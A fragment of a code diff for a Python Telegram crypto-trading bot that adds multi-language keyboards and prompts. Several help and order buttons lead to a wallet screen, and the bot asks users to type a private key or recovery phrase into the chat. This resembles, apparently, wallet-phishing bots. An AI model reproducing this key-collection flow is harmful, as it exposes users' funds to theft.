+            reply_markup=main_menu_keyboard(language),
         )
         return
 
@@ -1126,7 +1377,7 @@ async def button_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
     if data == "refresh":
         await query.edit_message_text(
             _home_screen_text(),
-            reply_markup=main_menu_keyboard(),
+            reply_markup=main_menu_keyboard(language),
         )
         return
 
@@ -1139,11 +1390,7 @@ async def button_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
         return
 
     if data == "recovery_add_wallet":
-        await query.edit_message_text(
-            _wallet_settings_text(),
-            parse_mode="MarkdownV2",
-            reply_markup=wallet_settings_keyboard(),
-        )
+        await _show_wallet_settings(query, language)
         return
 
     # ── Chains screen ─────────────────────────────────────────────────────────
@@ -1158,7 +1405,7 @@ async def button_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
     if data == "chains_back":
         await query.edit_message_text(
             _home_screen_text(),
-            reply_markup=main_menu_keyboard(),
+            reply_markup=main_menu_keyboard(language),
         )
         return
 
@@ -1170,28 +1417,16 @@ async def button_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
         return
 
     if data in ("help_recovery", "help_create_ticket"):
-        await query.edit_message_text(
-            _wallet_settings_text(),
-            parse_mode="MarkdownV2",
-            reply_markup=wallet_settings_keyboard(),
-        )
-        return
-
-    if data == "language_en":
-        await query.answer("English is already selected.")
-        await query.edit_message_text(
-            _home_screen_text(),
-            reply_markup=main_menu_keyboard(),
-        )
+        await _show_wallet_settings(query, language)
         return
 
     # ── Per-chain wallet screens ───────────────────────────────────────────────
     for chain in CHAINS:
         if data == f"chain_{chain}":
             await query.edit_message_text(
-                _chain_wallet_text(chain),
-                parse_mode="MarkdownV2",
-                reply_markup=chain_wallet_keyboard(chain),
+                _chain_wallet_text(chain, language),
+                parse_mode="Markdown",
+                reply_markup=chain_wallet_keyboard(chain, language),
             )
             return
 
@@ -1199,7 +1434,7 @@ async def button_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
             ctx.user_data["awaiting"] = AWAITING_PRIVATE_KEY
             await ctx.bot.send_message(
                 chat_id,
-                f"Please enter your {chain.upper()} private key or recovery phrase:",
+                pack["chain_import_prompt"].format(chain=chain.upper()),
                 reply_markup=ForceReply(selective=True),
             )
             return
@@ -1213,11 +1448,7 @@ async def button_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
         return
 
     if data in ("tpsl_active", "tpsl_closed", "tpsl_portfolio"):
-        await query.edit_message_text(
-            _wallet_settings_text(),
-            parse_mode="MarkdownV2",
-            reply_markup=wallet_settings_keyboard(),
-        )
+        await _show_wallet_settings(query, language)
         return
 
     # ── Limit Orders screen ───────────────────────────────────────────────────
@@ -1257,7 +1488,7 @@ async def button_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
         await ctx.bot.send_message(
             chat_id,
             "❌ Cancelled. Tap a button below to try again.",
-            reply_markup=main_menu_keyboard(),
+            reply_markup=main_menu_keyboard(language),
         )
         return
 
@@ -1266,7 +1497,7 @@ async def button_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
         await ctx.bot.send_message(
             chat_id,
             _home_screen_text(),
-            reply_markup=main_menu_keyboard(),
+            reply_markup=main_menu_keyboard(language),
         )
         return
 
@@ -1330,7 +1561,7 @@ async def message_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
                 uid,
                 f"✅ *Wallet imported successfully!*\n\n`{kp.pubkey()}`\n\nYou can now use all features.",
                 parse_mode="Markdown",
-                reply_markup=main_menu_keyboard(),
+                reply_markup=main_menu_keyboard(ctx.user_data.get("language", DEFAULT_LANGUAGE)),
             )
         except Exception as e:
             logger.error(f"Wallet import error: {e}")
@@ -1457,7 +1688,7 @@ async def confirm_swap(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
         chat_id,
         f"✅ *Swap submitted!*\n\n[View on Solscan](https://solscan.io/tx/{sig})",
         parse_mode="Markdown",
-        reply_markup=main_menu_keyboard(),
+        reply_markup=main_menu_keyboard(ctx.user_data.get("language", DEFAULT_LANGUAGE)),
     )
 
 # ── Entry point ───────────────────────────────────────────────────────────────
